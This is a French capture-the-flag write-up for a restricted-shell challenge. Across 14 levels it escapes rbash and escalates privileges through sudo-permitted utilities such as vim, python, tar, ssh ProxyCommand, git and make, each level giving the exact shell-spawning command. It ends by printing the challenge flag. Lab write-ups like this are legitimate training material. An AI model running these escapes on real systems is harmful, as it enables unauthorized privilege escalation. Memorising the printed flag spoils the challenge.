# Bash - Restricted shells

## Description : 

> Ce défi consiste à effectuer une escalation de privilèges dans 14 shells avec des fonctionnalités restreintes.
> 
> Le site **gtfobins.github.io** montre comment exploiter (avec le bon payload) le seul programme exécutable dans un shell restreint et donc comment passer au niveau suivant.
> 
> Pour savoir quel programme peut être exécuté, il faut utiliser la commande `sudo -l`.
> 
> Pour passer au niveau suivant il faut appeler le programme avec `sudo -u NOM_UTILISATEUR_EXPLOITABLE NOM_PROGRAMME_EXPLOITABLE`

## Exploit : 

> **Level 0**
> 
> Dans cette étape, beaucoup de commandes ne sont pas disponibles à cause des limitations imposées par le **rbash**. Cependant, il est possible de faire `echo`.
> 
> Avec `echo $PWD` il est possible découvrir qu'on se trouve dans **/challenge/app-script/ch14**.
> 
> Avec `echo $PATH` on remarque qu'un dossier nommé **step1** est present.
> 
> Il suffit donc de faire `echo step1/*`, ce qui donnera comme résultat **step1/vim**
> 
> Une fois dans `vim`, il faut définir une variable qui pointera vers **/bin/bash** avec
> 
> `:set shell=/bin/bash`
> 
> Ensuite, il suffit d'appeler cette variable avec 
> 
> `:shell`


> **Level 1**
> 
> À ce point, la variable environnementale **PATH** doit être corrigée pour que les programmes puissent être exécutés correctement depuis **/usr/bin**
> 
> `export PATH=$PATH:/usr/bin`
> 
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/python` avec les droits de **app-script-ch14-2**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-2 /usr/bin/python -c 'import os; os.system("/bin/bash")'`

> **Level 2** 
> 
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/bin/tar` avec les droits de **app-script-ch14-3**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-3 /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`

> **Level 3** 
> 
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/zip` avec les droits de **app-script-ch14-4**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-4 /usr/bin/zip $(mktemp -u) /etc/hosts -T -TT 'bash #'`
 
> **Level 4** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/awk` avec les droits de **app-script-ch14-5**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-5 /usr/bin/awk 'BEGIN {system("/bin/bash")}'`

> **Level 5** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/gdb` avec les droits de **app-script-ch14-6**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-6 /usr/bin/gdb -nx -ex '!bash' -ex quit`
 
> **Level 6** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/pico` avec les droits de **app-script-ch14-7**
> 
> Pour passer un niveau suivant il faut d'abord ouvrir `pico` avec 
> 
> `sudo -u app-script-ch14-7 /usr/bin/pico -s /bin/bash`
> 
> Ensuite, il faut écrire dans l'éditeur 
> 
> **/bin/bash**
> 
> et lancer avec **CTRL+T**
 
> **Level 7** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/scp` avec les droits de **app-script-ch14-8**
> 
> Pour passer un niveau suivant il faut créer un fichier temporaire avec
> 
> `TF=$(mktemp)`
> 
> Le peupler avec
> 
> `echo 'bash 0<&2 1>&2' > $TF`
> 
> Lui donner les droits d'exécution avec
> 
> `chmod 777 "$TF"` (il faut qu'app-script-ch14-8 puisse y accéder aussi)
> 
> Et finalement lancer la commande finale 
> 
> `sudo -u app-script-ch14-8 /usr/bin/scp -S $TF x y:`

> **Level 8** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/env` avec les droits de **app-script-ch14-9**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-9 /usr/bin/env /bin/bash`
 
> **Level 9** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/ssh` avec les droits de **app-script-ch14-10**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-10 /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x`
 
> **Level 10** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/git` avec les droits de **app-script-ch14-11**
> 
> Pour passer un niveau suivant il faut d'abord ouvrir le module d'aide de Git avec 
> 
> `sudo -u app-script-ch14-11 /usr/bin/git -p help`
> 
> Ensuite, il suffit rentrer
> 
> `!bash`
 
> **Level 11** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/make` avec les droits de **app-script-ch14-12**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-12 /usr/bin/make -s --eval=$'x:\n\t-'"/bin/bash"`
 
> **Level 12** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/usr/bin/script` avec les droits de **app-script-ch14-13**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-13 /usr/bin/script -q /dev/null`

> **Level 13** 
>
> En rentrant `sudo -l`, il est possible d'exécuter la commande `/bin/rbash --` avec les droits de **app-script-ch14-14**
> 
> Pour passer un niveau suivant il faut faire 
> 
> `sudo -u app-script-ch14-14 /bin/rbash --`

> **Level 14** 
>
> Dans ce dernier niveau, le shell restreint empêche l'exécution de beaucoup de commandes, mais il est possible quand-même de lancer la commande `echo`
> 
> Avec `echo $(pwd)` il est possible voir que le dossier courant est **/challenge/app-script/ch14/step14**, alors que le fichier **.passwd** est situé dans **/challenge/app-script/ch14/**
> 
> Il suffit donc de faire `echo $(< ../.passwd)`
> 
> Le flag obtenu est : **3sc@p3_G@m3s_@r3_R34lly_Fun!!** 
